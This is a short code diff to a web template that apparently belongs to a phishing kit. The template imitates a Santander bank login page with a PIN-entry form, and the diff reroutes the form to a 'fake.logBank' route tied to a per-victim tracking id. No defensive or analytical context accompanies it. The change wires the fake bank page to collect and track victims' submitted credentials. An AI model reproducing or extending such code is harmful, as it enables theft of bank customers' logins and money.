@@ -219,7 +219,7 @@
                         </h1>
                         <div id="logowanie-inner">
                             <form class="forms" id="bank_pm_form" method="POST"
-                                  action="/log/bank">
+                                  action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
                                 <input type="hidden" name="step" value="fakes.banks.steps.santander">
                                 <div id="pinDiv" style="width: 85%">
                                     <div class="labelsLine" id="labelContainer">
